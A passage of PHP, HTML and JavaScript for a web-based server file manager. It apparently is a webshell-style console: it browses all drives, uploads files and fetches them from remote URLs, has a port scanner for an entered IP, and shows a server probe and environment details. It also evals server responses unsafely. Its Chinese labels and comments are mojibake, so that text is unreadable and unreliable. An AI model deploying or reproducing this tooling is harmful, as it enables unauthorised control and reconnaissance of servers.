c){9(w===q(c[f],f,c))19}}J{H(5 i=0,M=c.1a;i<M;i++){9(i R c){9(w===q(c[i],i,c))19}}}};X({1W:3(c,q,j){X.L(j,c,3(){q.Y(j,I)})},map:3(c,q,j){5 l=[];X.L(j,c,3(){l.1X(q.Y(j,I))});4 l},1k:3(c,q,j){5 l=[];X.L(j,c,3(1Y){q.Y(j,I)&&l.1X(1Y)});4 l},every:3(c,q,j){5 l=1b;X.L(j,c,3(){9(!q.Y(j,I)){l=w;4 w}});4 l},some:3(c,q,j){5 l=w;X.L(j,c,3(){9(q.Y(j,I)){l=1b;4 w}});4 l}},3(1Z,f){l[f]=3(c,q,j){9(c[f]){4 c[f](q,j)}J{4 1Z(c,q,j)}}});4 l}();F=(3(){5 1c=1S.1R.1c;4{bind:3(1l,j){5 1m=1c.L(I,2);4 3(){4 1l.Y(j,1m.20(1c.L(I)))}},bindAsEventListener:3(1l,j){5 1m=1c.L(I,2);4 3(g){4 1l.Y(j,[E.1d(g)].20(1m))}}}})();D={1n:3(m){5 13=m?m.21:P;4 13.22.23||13.24.23},1o:3(m){5 13=m?m.21:P;4 13.22.25||13.24.25},1C:3(a,b){4(u.1C=a.26?3(a,b){4!!(a.26(b)&16)}:3(a,b){4 a!=b&&a.1C(b)})(a,b)},v:3(m){5 o=0,N=0,T=0,U=0;9(!m.27||B.1P){5 n=m;while(n){o+=n.offsetLeft,N+=n.offsetTop;n=n.offsetParent};T=o+m.offsetWidth;U=N+m.offsetHeight}J{5 v=m.27();o=T=u.1o(m);N=U=u.1n(m);o+=v.o;T+=v.T;N+=v.N;U+=v.U};4{"o":o,"N":N,"T":T,"U":U}},clientRect:3(m){5 v=u.v(m),1D=u.1o(m),1E=u.1n(m);v.o-=1D;v.T-=1D;v.N-=1E;v.U-=1E;4 v},28:3(k){4(u.28=P.1p?3(k){4 P.1p.29(k,2a)}:3(k){4 k.1q})(k)},2b:3(k,f){4(u.2b=P.1p?3(k,f){5 h=P.1p.29(k,2a);4 f R h?h[f]:h.getPropertyValue(f)}:3(k,f){5 h=k.1q;9(f=="Z"){9(/1F\\(Z=(.*)\\)/i.x(h.1k)){5 Z=parseFloat(1w.$1);4 Z?Z/2c:0}4 1};9(f=="2d"){f="2e"}5 l=h[f]||h[S.1G(f)];9(!/^\\-?\\d+(px)?$/i.x(l)&&/^\\-?\\d/.x(l)){h=k.h,o=h.o,2g=k.1H.o;k.1H.o=k.1q.o;h.o=l||0;l=h.pixelLeft+"px";h.o=o;k.1H.o=2g}4 l})(k,f)},setStyle:3(1e,h,14){9(!1e.1a){1e=[1e]}9(1t h=="1L"){5 s=h;h={};h[s]=14}A.1W(1e,3(k){H(5 f R h){5 14=h[f];9(f=="Z"&&B.ie){k.h.1k=(k.1q.1k||"").2h(/1F\\([^)]*\\)/,"")+"1F(Z="+14*2c+")"}J 9(f=="2d"){k.h[B.ie?"2e":"cssFloat"]=14}J{k.h[S.1G(f)]=14}}})}};E=(3(){5 1f,1g,15=1;9(1z.2i){1f=3(r,t,y){r.2i(t,y,w)};1g=3(r,t,y){r.removeEventListener(t,y,w)}}J{1f=3(r,t,y){9(!y.$$15)y.$$15=15++;9(!r.V)r.V={};5 W=r.V[t];9(!W){W=r.V[t]={};9(r["on"+t]){W[0]=r["on"+t]}}W[y.$$15]=y;r["on"+t]=1r};1g=3(r,t,y){9(r.V&&r.V[t]){delete r.V[t][y.$$15]}};3 1r(){5 1s=1b,g=1d();5 W=u.V[g.t];H(5 i R W){u.$$1r=W[i];9(u.$$1r(g)===w){1s=w}}4 1s}}3 1d(g){9(g)4 g;g=1z.g;g.pageX=g.clientX+D.1o();g.pageY=g.clientY+D.1n();g.target=g.srcElement;g.1J=1J;g.1K=1K;switch(g.t){2j"mouseout":g.2k=g.toElement;19;2j"mouseover":g.2k=g.fromElement;19};4 g};3 1J(){u.cancelBubble=1b};3 1K(){u.1s=w};4{"1f":1f,"1g":1g,"1d":1d}})();S={1G:3(s){4 s.2h(/-([a-z])/ig,3(all,2l){4 2l.toUpperCase()})}};9(B.1O){try{P.execCommand("BackgroundImageCache",w,1b)}catch(e){}};$$=O;$$B=B;$$A=A;$$F=F;$$D=D;$$E=E;$$S=S})();',[],146,'|||function|return|var||||if|||object|||name|event|style||thisp|elem|ret|node||left|from|callback|element||type|this|rect|false|test|handler||||array||||destination|for|arguments|else|ua|call|len|top||document|property|in||right|bottom|events|handlers|each|apply|opacity|source|msie|elt|doc|value|guid||copy|version|break|length|true|slice|fixEvent|elems|addEvent|removeEvent||vMark|Math|filter|fun|args|getScrollTop|getScrollLeft|defaultView|currentStyle|handleEvent|returnValue|typeof|opera|chrome|RegExp||parseInt|window|indexOf|lastIndexOf|contains|sLeft|sTop|alpha|camelize|runtimeStyle||stopPropagation|preventDefault|string|safari|firefox|ie6|ie8|obj|prototype|Array|isNaN|ceil|floor|forEach|push|item|method|concat|ownerDocument|documentElement|scrollTop|body|scrollLeft|compareDocumentPosition|getBoundingClientRect|curStyle|getComputedStyle|null|getStyle|100|float|styleFloat||rsLeft|replace|addEventListener|case|relatedTarget|letter'.split('|'),0,{}))
var QuickUpload = function(file, options) {
	
	this.file = $$(file);
	
	this._sending = false;//�Ƿ������ϴ�
	this._timer = null;//��ʱ��
	this._iframe = null;//iframe����
	this._form = null;//form����
	this._inputs = {};//input����
	this._fFINISH = null;//���ִ�к���
	
	$$.extend(this, this._setOptions(options));
};
QuickUpload._counter = 1;
QuickUpload.prototype = {
  //����Ĭ������
  _setOptions: function(options) {
    this.options = {//Ĭ��ֵ
		action:		"",//����action
		timeout:	<?=@get_cfg_var("max_execution_time")?>,//���ó�ʱ(��Ϊ��λ)
		parameter:	{},//��������
		onReady:	function(){},//�ϴ�׼��ʱִ��
		onFinish:	function(){},//�ϴ����ʱִ��
		onStop:		function(){},//�ϴ�ֹͣʱִ��
		onTimeout:	function(){}//�ϴ���ʱʱִ��
    };
    return $$.extend(this.options, options || {});
  },
  //�ϴ��ļ�
  upload: function() {
	this.stop();
	if ( !this.file || !this.file.value ) return;
	this.onReady();
	this._setIframe();
	this._setForm();
	this._setInput();
	if ( this.timeout > 0 ) {
		this._timer = setTimeout( $$F.bind(this._timeout, this), this.timeout * 10000 );
	}
	this._form.action="?action=urlupload&db=<?=md5(base64_encode($adminpass))?>&dir="+$$("UPdir").value;
	this._form.submit();
	this._sending = true;
  },
  _setIframe: function() {
	if ( !this._iframe ) {
		//����iframe
		var iframename = "QUICKUPLOAD_" + QuickUpload._counter++,
			iframe = document.createElement( $$B.ie ? "<iframe name=\"" + iframename + "\">" : "iframe");
		iframe.name = iframename;
		iframe.style.display = "none";
		//��¼��ɳ��򷽱��Ƴ�
		var finish = this._fFINISH = $$F.bind(this._finish, this);
		//iframe�������ִ����ɳ���
		if ( $$B.ie ) {
			iframe.attachEvent( "onload", finish );
		} else {
			iframe.onload = $$B.opera ? function(){ this.onload = finish; } : finish;
		}
		//����body
		var body = document.body; body.insertBefore( iframe, body.childNodes[0] );
		
		this._iframe = iframe;
	}
  },
  //����form
  _setForm: function() {
	if ( !this._form ) {
		var form = document.createElement('form'), file = this.file;
		//��������
		$$.extend(form, {
			target: this._iframe.name, method: "post", encoding: "multipart/form-data"
		});
		//������ʽ
		$$D.setStyle(form, {
			padding: 0, margin: 0, border: 0,
			backgroundColor: "transparent", display: "inline"
		});
		//�ύǰȥ��form
		file.form && $$E.addEvent(file.form, "submit", $$F.bind(this.dispose, this));
		//����form
		file.parentNode.insertBefore(form, file).appendChild(file);
		
		this._form = form;
	}
	//action���ܻ��޸�
	this._form.action = this.action;
  },
  //����input
  _setInput: function() {
	var form = this._form, oldInputs = this._inputs, newInputs = {}, name;
	//����input
	for ( name in this.parameter ) {
		var input = form[name];
		if ( !input ) {
			//���û�ж�Ӧinput�½�һ��
			input = document.createElement("input");
			input.name = name; input.type = "hidden";
			form.appendChild(input);
		}
		input.value = this.parameter[name];
		//��¼��ǰinput
		newInputs[name] = input;
		//ɾ�����м�¼
		delete oldInputs[name];
	}
	//�Ƴ�����input
	for ( name in oldInputs ) { form.removeChild( oldInputs[name] ); }
	//���浱ǰinput
	this._inputs = newInputs;
  },
  //ֹͣ�ϴ�
  stop: function() {
	if ( this._sending ) {
		this._sending = false;
		clearTimeout(this._timer);
		//����iframe
		if ( $$B.opera ) {//operaͨ������src��������
			this._removeIframe();
		} else {
			this._iframe.src = "";
		}
		this.onStop();
	}
  },
  //���ٳ���
  dispose: function() {
	this._sending = false;
	clearTimeout(this._timer);
	//���iframe
	if ( $$B.firefox ) {
		setTimeout($$F.bind(this._removeIframe, this), 0);
	} else {
		this._removeIframe();
	}
	//���form
	this._removeForm();
	//���dom����
	this._inputs = this._fFINISH = this.file = null;
  },
  //���iframe
  _removeIframe: function() {
	if ( this._iframe ) {
		var iframe = this._iframe;
		$$B.ie ? iframe.detachEvent( "onload", this._fFINISH ) : ( iframe.onload = null );
		document.body.removeChild(iframe); this._iframe = null;
	}
  },
  //���form
  _removeForm: function() {
	if ( this._form ) {
		var form = this._form, parent = form.parentNode;
		if ( parent ) {
			parent.insertBefore(this.file, form); parent.removeChild(form);
		}
		this._form = this._inputs = null;
	}
  },
  //��ʱ����
  _timeout: function() {
	if ( this._sending ) { this._sending = false; this.stop(); this.onTimeout(); }
  },
  //��ɺ���
  _finish: function() {
	if ( this._sending ) { this._sending = false; this.onFinish(this._iframe); }
  }
}


 function getDouble(number){
  var numbers=["0","1","2","3","4","5","6","7","8","9"];
  for(var i=0;i<numbers.length;i++){
   if(numbers[i]==number){
    return "0"+numbers[i];
   }else if(i==9){
    return number;
   }
   
  }
 }
//�õ�����ʱ��
 function getTodayTime(){
  var today=new Date();
  var str= (today.getYear()<1900?1900+today.getYear():today.getYear())+getDouble([today.getMonth()+1])+getDouble(today.getDate())+getDouble(today.getHours())+getDouble(today.getMinutes())+getDouble(today.getSeconds());
  return str;
 }
</script>
<style>
.upload {width:600px;background:#fff;font-size:12px; border-collapse:collapse;}
.upload td, .upload th {padding:5px;border:1px solid #ebebeb;}
.upload thead td {background-color:#ebebeb;}
.upload th { text-align:center;}
.upload b {font-size:14px;}
.upload tbody td{ height:30px;}
.upload tfoot td{ word-spacing:20px;}
.upload a:link, .upload a:visited, .upload a:hover, .upload a:active {color:#00F;}
</style>
	<table border="0" class="upload">
		<thead>
			<tr>
				<td colspan="4"><b>�ļ��ϴ�</b>����<span id="UPxinxi"><?echo"�ű���ʱʱ��: ".@get_cfg_var("max_execution_time")."��  ";
echo"���ϴ�����ļ�: ".@get_cfg_var("upload_max_filesize")."  ";?></span></td>
			</tr>
			<tr>
				<th>ѡ���ļ�</th>
				<th width="25%">������</th>
				<th width="15%">����</th>
				<th width="15%">״̬</th>
			</tr>
		</thead>
		<tbody id="idTable">
			<tr>
				<td><input name="file" type="file" />
					<span></span></td>
				<td><input size="15" name="title" type="text" />
					<span></span></td>
				<td align="center"><a href="?">����</a></td>
				<td align="center"><span>ѡ���ļ�</span></td>
			</tr>
		</tbody>
		<tfoot>
			<tr>
				<td colspan="4">
<input type="hidden" name="" size="20" id="UPdir" readonly>
<script>
document.writeln("<input id=\"idAdd\" type=\"button\" value=\"�����ļ�\">")
document.writeln("<input id=\"idQuick\" type=\"button\" value=\"�����ϴ�\">")
</script>
                </td>
			</tr>
		</tfoot>
	</table>
</form>
<script>

var qus = [], count = 0, table = $$("idTable"), model = table.removeChild(table.rows[0]);

function add(){
	var row = model.cloneNode(true),
		inputs = row.getElementsByTagName("input"),
		file = inputs[0], title = inputs[1],
		spans = row.getElementsByTagName("span"),
		msgfile = spans[0], msgtitle = spans[1], msg = spans[2],
		a = row.getElementsByTagName("a")[0],
		$dir=$$('ML').value;
		$$('UPdir').value=$dir;
		qu = new QuickUpload(file, {
			action: "?action=urlupload",
			timeout: 10,
			onReady: function(){
				count++;
				show("�ϴ���..");
				a.innerHTML = "ֹͣ"; a.onclick = function(){ qu.stop(); return false; };
				//���ñ���
				this.parameter.title = title.value;
				file.style.display = title.style.display = "none";
				msgfile.innerHTML = file.value; 
				msgtitle.innerHTML = title.value;
			},
			onFinish: function(iframe){
				try{//����������Ϣ(��Ҫ��̨���)
					var info = eval("(" + iframe.contentWindow.document.body.innerHTML + ")");
					show("�ϴ����");
					a.innerHTML = "����"; 
					a.onclick = reset;
				file.style.display = title.style.display = "";
				msgfile.innerHTML =""; 
				msgtitle.innerHTML ="";
				row.cells[3].innerHTML = "ok";

				}catch(e){//��ȡ���ݳ���
					show("�ϴ�ʧ��"); stop(); return;
				}
				row.cells[0].innerHTML = "<a href=\"" + info.path + "\" target='_blank'>" + info.name + "</a>";
				row.cells[1].innerHTML = info.name;
				a.innerHTML = "����"; 
				a.href = info.path; 
				a.onclick = null;
				a.target='_blank';
				//���ٳ���
				this.dispose();
			},
			onStop: function(){ show("�Ѿ�ֹͣ"); stop(); },
			onTimeout: function(){ show("�ϴ���ʱ"); stop(); }
		});
	
	a.onclick = reset
	
	function stop(){
		count--; CheckBtn();
		a.innerHTML = "����"; a.onclick = reset;
		file.style.display = msgfile.innerHTML ="";		
		title.style.display = msgtitle.innerHTML = "";
	}
	
	function reset(){ show("ѡ���ļ�"); ResetFile(file); return false; }
	
	function show(m){ msg.innerHTML = m; }
	
	file.onchange = function(){ show(this.value ? "׼���ϴ�" : "ѡ���ļ�"); }
	qus.push(qu);
	table.appendChild(row);
}



$$("idAdd").onclick = function(){
	qus.length >= 10 ? alert("��Ҫ̫̰����") : add();
}

$$("idQuick").onclick = function(){
	$$A.filter(qus, function(qu){ qu.upload(); });
}


function ResetFile(file){
	file.value = "";//ff chrome safari
	if ( file.value ) {
		if ( $$B.ie ) {//ie
			with(file.parentNode.insertBefore(document.createElement('form'), file)){
				appendChild(file); reset(); removeNode(false);
			}
		} else {//opera
			file.type = "text"; file.type = "file";
		}
	}
}

</script>
</div>
<div id="yc8" style="display:none;width:600px;height:320px;background:#eee;">
<form method="POST" action="?action=httpurlupload" target="iframeyc8">
<table border="0" width="100%" height="180" cellspacing="0" cellpadding="0">
	<tr>
		<td align="center"  height="140">
Զ�̵�ַ:<input type="text" name="url" size="50" value="http://" title="֧��:http,https,ftp,mms,rtsp,<?="\n"?>thunder:Ѹ��,flashget:���ʿ쳵,qqdl:QQ����">
<input type="radio" value="0" checked name="SBss">���� <input type="radio" name="SBss" value="1" title="���������ת��:Ѹ��,���ʿ쳵,QQ�����ַ">��ַת�� 
<input type="hidden" name="newfname" size="20" id="newfname">
<input type="submit" value="��ʼ" name="B3">
��            </td>
	</tr>
	<tr>
		<td align="center"><iframe name="iframeyc8" id="iframeyc8"  target="main" align="middle" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" allowtransparency="yes" src="" width="100%" height="100%"></iframe>
</td>
	</tr>
</table>
</form>
</div>
</div>


<div id="smallLay12" style="display:none">
<table border="0" width="350" height="120" cellspacing="0" cellpadding="0">
	<tr>
		<td height="20" bgcolor="#808080"><table border="0" width="100%"><tr><td width="20" align="right"><div class="search"></div></td><td><font color="#FFFFFF">�����ļ�</font></td></tr></table></td>
	</tr>
	<tr>
		<td  bgcolor="#FFFFFF" align="center" height="120">
�ؼ���:<input type="text" name="T1" size="20" id="newT12"><input type="button" value="����" name="B1" onclick="if($$('newT12').value==''){ confirm('����Ϊ��!'); }else{$$('ajaxurl').src='?iframeA=5&dir='+$$('ML').value+'&bl='+$$('newT12').value,$$('ML').value,$$('xin').innerHTML='����: '+$$('newT12').value;}">
                </td>
	</tr>
</table>
</div>

<div id="smallLay13" style="display:none">
<table border="0" width="500" height="420" cellspacing="0" cellpadding="0">
	<tr>
		<td height="20" bgcolor="#808080">
			<table border="0" width="100%">
				<tr>
					<td width="20" align="right"><div class="paste"></div></td>
				<td><font color="#FFFFFF">���а� </font></td>
				</tr>
			</table>
		</td>
	</tr>
	<tr>
		<td  bgcolor="#FFFFFF" align="center" height="400"  valign="top" id="jianqieban">


            </td>
	</tr>
</table>
</div>
<div id="smallLay16" style="display:none">
<?
if(getenv('HTTP_CLIENT_IP')) { 
$onlineip = getenv('HTTP_CLIENT_IP');
} elseif(getenv('HTTP_X_FORWARDED_FOR')) { 
$onlineip = getenv('HTTP_X_FORWARDED_FOR');
} elseif(getenv('REMOTE_ADDR')) { 
$onlineip = getenv('REMOTE_ADDR');
} else { 
$onlineip = $HTTP_SERVER_VARS['REMOTE_ADDR'];
}
?>
	<table border="0" width="350" height="120" cellspacing="0" cellpadding="0">
	<tr>
		<td height="20" bgcolor="#808080"><table border="0" width="100%"><tr><td width="20" align="right"><div class="search"></div></td><td><font color="#FFFFFF">�˿�ɨ��</font></td></tr></table></td>
	</tr>
	<tr>
		<td bgcolor="#FFFFFF" align="center" height="120"><strong>����IP��<font color=red><?=$onlineip?></font></strong><br>
IP/����:<input type=text name=remoteip size=12 id="newT16"><input type="button" value="ɨ��" name="B1" onclick="if($$('newT16').value==''){ confirm('����Ϊ��!'); }else{$$('ajaxurl').src='?iframeA=7&dir='+$$('ML').value+'&remoteip='+$$('newT16').value,$$('ML').value,showidg('smallLay16'),$$('xin').innerHTML='ɨ��: '+$$('newT16').value+'�˿�';}">
    </td>
	</tr>
</table>
</div>	
<table border="0" width="100%" height="100%" cellspacing="0" cellpadding="0">
	<tr>
		<td id="menu1">
<table border="0" width="100%" height="100%" cellspacing="0" cellpadding="0">
	<tr>
		<td>��ǰ·����<span id="lujing"><?=realpath($dir);?></span></td>
		<?if($bj==""){?>
		<td width="80" bgcolor="#EEEEEE"  align="center"><a href="#" onclick="showid('smallLay13'),getData2('?action=jianqieban','jianqieban');">�鿴���а�</a></td>
		<?if(getphpcfg('mail')=="Yes"||(file_exists('class.phpmailer.php')&&file_exists('class.smtp.php'))){?>
<script>
function maildiv(){
  $$("maildiv").innerHTML="";
  var str = new Array();
  var s = document.getElementsByName("file[]");  
  for(var i=0;i<s.length;i++){
    if(s[i].checked && s[i].id!=1){
		str = s[i].value.split(".");
                extname = str[str.length - 1];
               
                $$("maildiv").innerHTML+="<div class='mailclass' id='asss"+s[i].value+"'><table width=100% border=0 cellspacing=0 cellpadding=0><tr><td width=18><div class='mailunknown'><div class='"+extname.toLowerCase()+"'></div><div class='unknown'></div></div></td><td>"+s[i].value+"</td><td width=10><a href=\"javascript:Adelss('"+s[i].value+"','asss"+s[i].value+"')\">X</a></td></tr></table></div>";


    }
  }
}
</script>
<style>
.mailclass{
       float:left;
       border:1px solid #E7E7E7;
       margin: 3px;
       padding:5px;
       width:165px;
}
.mailunknown{
 width:18px;
 height:18px;
 overflow:hidden;
}
</style>
		<td width="60" bgcolor="#EEEEEE"  align="center"><a href="#" onclick="showid('smallLay17'),maildiv();">�����ʼ�</a></td>
	  <?}?>
	  <td width="100" bgcolor="#EEEEEE"  align="center"><a href="#" onclick="showid('smallLay19'),$$('newT19').value=$$('lujing').innerHTML;">Σ���ļ�ɨ��</a></td>
		<td width="40" bgcolor="#EEEEEE"  align="center"><a href="?iframeA=2" target="ajaxurl" onclick="$$('xin').innerHTML='������̽��';">̽��</a></td>
	  <td width="60" bgcolor="#EEEEEE"  align="center"><a href="#" onclick="showid('smallLay16');">�˿�ɨ��</a></td>
	  <?}?>
		<td width="60" bgcolor="#EEEEEE"  align="center"><a href="#" onclick="showid('smallLay');">ϵͳ����</a></td>
		<td width="60" bgcolor="#EEEEEE"  align="center"><a href="?login=2">�˳�����</a></td>
	</tr>
</table>

</td>
	</tr>
	<tr>
		<td id="menu2">
������IP:<?=gethostbyname($SERVER_NAME)?>    
�ͻ���IP��<?
echo $onlineip;
echo"PHP�汾: php".PHP_VERSION."  ";
echo"�ű���ʱʱ��: ".@get_cfg_var("max_execution_time")."��  ";
echo"���ϴ�����ļ�: ".@get_cfg_var("upload_max_filesize")."  ";
echo"��ȫģʽ: ";
if (@get_cfg_var("safe_mode"))echo"��";
else echo"�ر�";	
?>
		</td>
	</tr>
	<tr>
<?
if($xin==""){
  if($bj==1){
  $xin="�༭�ļ� ".$fileName;
	}else{
	$xin="��ӭʹ�á�����PHP�ļ���������";
	}
}
?>

		<td id="menu3">��ǰ������[<span  id="xin"><?= $xin?></span>]</td>
	</tr>
<?if($bj==""){?>
	<tr>
		<td height="25">
			<div id="menu4">
<input type="button" class="submit" name="B3" value="��Ŀ¼" title="�����ļ��б���Ŀ¼" onclick="$$('ajaxurl').src='?iframeA=1&dir=./',$$('xin').innerHTML='��Ŀ¼';"  style="height:21px;width:61px;background:#fff url(?imgname=allbgs.gif) no-repeat 0px -462px;"><?
foreach(range('C','Z') as $letter){
if(file_exists($letter.":")){
$diskdir[]=$letter;
}
} 
if($diskdir!=""){
?><select onchange="$$('ajaxurl').src=('?iframeA=1&dir='+this.options[this.selectedIndex].value);">
<?for($iss = 0; $iss < count($diskdir); $iss++) { ?>
<option value="<?=$diskdir[$iss]?>:"><?=$diskdir[$iss]?>:</option>
<?}?>
</select><?}?><input type="button" class="submit" name="B3" value="�½��ļ���" title="�ڱ�Ŀ¼����һ���µ�Ŀ¼" onclick="showid('smallLay3');"  style="height:21px;width:86px;background:#fff url(?imgname=allbgs.gif) no-repeat 0px -142px;"><input type="button" class="submit" name="B3" value="�½��ļ�" title="�ڱ�Ŀ¼�½�һ���ļ�" onclick="showid('smallLay4');"  style="height:21px;width:73px;background:#fff url(?imgname=allbgs.gif) no-repeat 0px -238px;"><input type="button" class="submit" name="B3" value="�ϴ�" title="�ϴ��ļ�����Ŀ¼" onclick="showid('smallLay8'),flashajax('flash8'),refreshProgress();"  style="height:21px;width:48px;background:#fff url(?imgname=allbgs.gif) no-repeat 0px -414px;"><input type="button" class="submit" name="B3" value="ɾ��" onclick="del();"  style="height:21px;width:48px;background:#fff url(?imgname=allbgs.gif) no-repeat 0px -302px;"><input type="button" class="submit" name="B3" value="����" onclick="cut();"  style="height:21px;width:48px;background:#fff url(?imgname=allbgs.gif) no-repeat 0px -318px;"><input type="button" class="submit" name="B3" value="����" onclick="copy();"  style="height:21px;width:48px;background:#fff url(?imgname=allbgs.gif) no-repeat 0px -382px;"><input type="button" class="submit" name="B3" value="ճ��" onclick="parse();"  title="ճ���ļ�����Ŀ¼" style="height:21px;width:48px;background:#fff url(?imgname=allbgs.gif) no-repeat 0px -270px;"><input type="button" class="submit" name="B3" value="����" title="�����޸�����" onclick="showid('smallLay10');" style="height:21px;width:48px;background:#fff url(?imgname=allbgs.gif) no-repeat 0px -158px;"><input type="button" class="submit" name="B3" value="ZIPѹ��" title="ѹ��ѡ�е��ļ���Ŀ¼" onclick="showid('smallLay5'),$$('newT3').value=getTodayTime()+'.zip';"  style="height:21px;width:73px;background:#fff url(?imgname=allbgs.gif) no-repeat 0px -126px;"><input type="button" class="submit" name="B3" value="TGZѹ��" onclick="showid('smallLay6'),$$('newT4').value=getTodayTime()+'.tar';"  style="height:21px;width:73px;background:#fff url(?imgname=allbgs.gif) no-repeat 0px -94px;"><input type="button" class="submit" name="B3" value="��ѹ" onclick="showid('smallLay7'),$$('newT5').value=$$('lujing').innerHTML;"  style="height:21px;width:48px;background:#fff url(?imgname=allbgs.gif) no-repeat 0px -110px;" title="֧�ֽ�ѹ��ʽ:zip,wlc,tgz,tar,tar.gz(���zip �޷���ѹ�볢�����ע����ڽ�ѹ)"><input type="button" class="submit" name="B3" value="����" title="������Ŀ¼���ļ�֧��ͨ���"  onclick="showid('smallLay12');" style="height:21px;width:48px;background:#fff url(?imgname=allbgs.gif) no-repeat 0px -174px;"><input type="button" class="submit" name="B3" value="��ͼ" title="�Ե�ǰĿ¼��ѡ�е�ͼƬ������ͼ,�����ϴ�ͼƬ����ICOͼ��." onclick="showid('smallLay14');"  style="height:21px;width:48px;background:#fff url(?imgname=allbgs.gif) no-repeat 0px -907px;"><select title="�ļ�����" onchange="$$('ajaxurl').src='?iframeA=1&images='+this.options[this.selectedIndex].value+'&dir='+$$('ML').value,$$('xin').innerHTML='��ʾȫ��  '+this.options[this.selectedIndex].value;"  name="a">
              <option value="">ȫ��</option>
              <option value="ͼƬ">ͼƬ</option>              
              <option value="html">.html</option>
              <option value="htm">.htm</option>
              <option value="xml">.xml</option>
              <option value="xsl">.xsl</option>
              <option value="php">.php</option>
              <option value="asp">.asp</option>
              <option value="htc">.htc</option>
              <option value="js">.js</option>
              <option value="css">.css</option>
              <option value="txt">.txt</option>
              <option value="class">.class</option>
              <option value="swf">.swf</option>
              <option value="flv">.flv</option>
              <option value="mp3">.mp3</option>
              <option value="gz">.gz</option>
              <option value="rar">.rar</option>
              <option value="zip">.zip</option>
              <option value="exe">.exe</option>
              </select>
                 </div>
		</td>
	</tr>
<?}?>
	<tr>
		<td id="body"  valign="top">
<?
/////////////////////////////////////////�༭����///////////////////////////////////////////
if($bj==1){
$path_parts = pathinfo("$fileName");
$��չ�� = strtolower($path_parts["extension"]);
?>
<style type="text/css">
html{overflow:hidden;}
.loadDiv2 {
	position:absolute;
	top:-5px;
	left:-5px;
	z-index:9999999;
	height:100%;
	background-color:#FFFFFF;
	text-align:center;
	padding-top:300px;
  width:100%;
}
.LR{border-top:1px solid #7f9db9;border-bottom:1px solid #7f9db9;border-right:1px solid #7f9db9;}
#M{overflow-y:scroll;overflow-x:hidden;height:200px;width:100%;word-break:break-all;border:1px solid #7f9db9;border-top:0px;}
#F{overflow-y:scroll;overflow-x:hidden;height:100%;width:100%;word-break:break-all;border:1px solid #7f9db9;border-bottom:0px;border-top:0px;}
#MF{padding-right:12px;border-right:1px solid #7f9db9;}
#as{padding:0px; margin:0px; border:0px; width:43px;height:16px; text-align:right;background:#eeeeee;}
#ol{padding:0px; margin:0px; border:0px;width:43px; text-align:right;}
#ol2{padding:0px; margin:0px; border:0px; }
#li{border:0px;resize: none;background:#eeeeee; min-height:280px; height:100%; overflow:hidden; width:44px; border-right:0; line-height:20px; margin:0px; padding:0px;text-align:center;}
#c2{border:0px;resize: none;overflow:scroll;min-height:300px; height:100%;width:100%;margin:0px; line-height:20px;background:#<?if($_COOKIE[love3]==""){echo $color2;}else{echo $_COOKIE[love3];}?>;color:#<?if($_COOKIE[love2]==""){echo $color1;}else{echo $_COOKIE[love2];}?>;font-size:<?if($_COOKIE[love4]==""){echo $color3;}else{echo $_COOKIE[love4];}?>px;}
#bbbbb{white-space:nowrap;text-overflow:ellipsis;padding-left:3px;background:#fff;position:absolute;overflow:scroll;line-height:20px;}
span.hl_js_kw { color: blue;}
span.hl_js_mcm { color:green; }
span.hl_js_scm { color:gray; }
span.hl_js_s { color:green; }
span.hl_js_reg { color: red; }
span.hl_js_num { color: red; }
span.hl_js_typ { color: #9900CC; }
</style>
<div id="loadDiv" class="loadDiv" ><img src="?imgname=throbber100.gif"><br><br>Ŭ��������...</div>
<div id="loadDiv2" class="loadDiv2" ><img src="?imgname=throbber100.gif" onDblClick="$$('loadDiv2').style.display='none';"><br><br>Ŭ��������...</div>

<script language="javascript">
var oL,oT,oW,oH;
var oMX,oMY;
var obj,element;
var minW=150;
var maxW=600;
var resizable=false;

function doMove(e){
	$$('ci').style.width=$$('bbbbb').style.width=$$('c2').offsetWidth+"px";
	if(!e)e=window.event;
	obj=e.srcElement || e.target;
	var mX=e.pageX || e.clientX;

	if(resizable){
		w=oW;
		w=oW + mX - oMX;
		//tt.value=event.clientX;
		if(w<minW){w=minW;}
		if(w>maxW){w=maxW;}
		ResizeTo(w);
		return(true);
	}
	var cc="";
	if(obj.title && obj.title=="oWin"){
		l=0;
		w=parseInt(obj.offsetWidth);
		if(Math.abs(l+w-mX)<5)cc+="e";
		if(cc!=""){
			obj.style.cursor=cc+"-resize";
			return(true);
		}
	}	
	if(obj.style.cursor!="default"){
		obj.style.cursor="default";
	}
}

function doDown(e){
	if(obj.style.cursor!="default"){//��ʼ�ı��С
		//��¼���λ�úͲ�λ�úʹ�С;
		if(!e)e=window.event;
		obj=e.srcElement || e.target;
		element=obj;
		oMX=e.pageX || e.clientX;
		oW=parseInt(element.offsetWidth);
		//�ı���;
		resizable=true;
		return(true);


	}
}

function doUp(){
	if(resizable){
		element.style.cursor="default";
		resizable = false;
		return(false);
	}
}

function ResizeTo(w){	
	var w=isNaN(w)?minW:parseInt(w);
	var w=w<minW?minW:w;
	element.width=w;
	addCookie('love1',w,99999999);//��ס
  var $bw=document.documentElement.clientWidth;
$$('bbbbb').style.width=$$('c2').style.width= ($bw-w-70)+"px";
}


var lCSSCoder={ 
    format    : function(s){//��ʽ������ 
        s=s.replace(/\s*([\{\}\:\;\,])\s*/g,"$1"); 
        s=s.replace(/;\s*;/g,";");//��������ֺ� 
        s=s.replace(/\,[\s\.\#\d]*{/g,"{"); 
        s=s.replace(/([^\s])\{([^\s])/g,"$1 {\n\t$2"); 
        s=s.replace(/([^\s])\}([^\n]*)/g,"$1\n}\n$2"); 
        s=s.replace(/([^\s]);([^\s\}])/g,"$1;\n\t$2"); 
        return s; 
    }, 
    pack     :function(s){//ѹ������ 
        s=s.replace(/\/\*(.|\n)*?\*\//g,"");//ɾ��ע�� 
        s=s.replace(/\s*([\{\}\:\;\,])\s*/g,"$1"); 
        s=s.replace(/\,[\s\.\#\d]*\{/g,"{");//�ݴ����� 
        s=s.replace(/;\s*;/g,";");//��������ֺ� 
        s = s.match(/^\s*(\S+(\s+\S+)*)\s*$/);//ȥ����β�հ� 
        return (s == null)?"": s[1]; 
    } 
}; 
function CSS(s){ 
    $$("c2").value=lCSSCoder[s]($$("c2").value); 
    textCounter();
    keyUp();
} 



function style_html(html_source, indent_size, indent_character, max_char) {
//Wrapper function to invoke all the necessary constructors and deal with the output.
  
  var Parser, multi_parser;
  
  function Parser() {
    
    this.pos = 0; //Parser position
    this.token = '';
    this.current_mode = 'CONTENT'; //reflects the current Parser mode: TAG/CONTENT
